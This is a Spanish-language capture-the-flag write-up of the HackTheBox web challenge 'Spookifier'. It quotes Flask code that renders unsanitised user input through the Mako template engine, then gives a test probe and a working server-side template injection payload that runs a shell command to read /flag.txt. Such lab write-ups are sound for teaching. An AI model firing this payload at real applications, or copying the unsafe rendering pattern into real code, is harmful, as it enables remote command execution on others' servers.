# Writeup - Spookifier (HackTheBox)

**Máquina:** Spookifier  
**Plataforma:** HackTheBox  
**Autor del challenge:** Xclow3n  
**Clasificación:** Official  

## Resumen

Spookifier es un challenge de web que explota una **Server-Side Template Injection (SSTI)** en el motor de plantillas **Mako** de Python. Permite ejecución remota de comandos para leer la flag.

---

## 1. Reconocimiento

La aplicación web presenta un formulario donde se ingresa un texto y devuelve cuatro variaciones del mismo en diferentes fuentes.

### Análisis del código fuente

La ruta principal en `application/blueprints/routes.py`:

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)
    return render_template('index.html', output='')
```

`spookify` en `application/util.py` llama a `change_font` y luego a `generate_render`:

```python
def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)

def generate_render(converted_fonts):
    result = '''
    <tr><td>{0}</td></tr>
    <tr><td>{1}</td></tr>
    <tr><td>{2}</td></tr>
    <tr><td>{3}</td></tr>
    '''.format(*converted_fonts)
    return Template(result).render()
```

El input del usuario se inserta directamente en la plantilla sin sanitización, y se renderiza con **Mako**.

---

## 2. Explotación — SSTI

### Verificación

Enviamos una expresión matemática simple:

```
${7*7}
```

El resultado muestra `49`, confirmando la inyección de template.

### RCE

Usamos el payload estándar para Mako SSTI que accede al módulo `os` vía `TemplateNamespace`:

```
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

La flag aparece en la respuesta.

---

## Resumen de la cadena de ataque

| Paso | Técnica | Resultado |
|-------|---------|-----------|
| 1 | Analizar código fuente | Identificar uso de Mako `Template().render()` sin sanitizar |
| 2 | Probar `${7*7}` | Confirmar SSTI |
| 3 | `${self.module.cache.util.os.popen('cat /flag.txt').read()}` | Flag `<REDACTED>` |
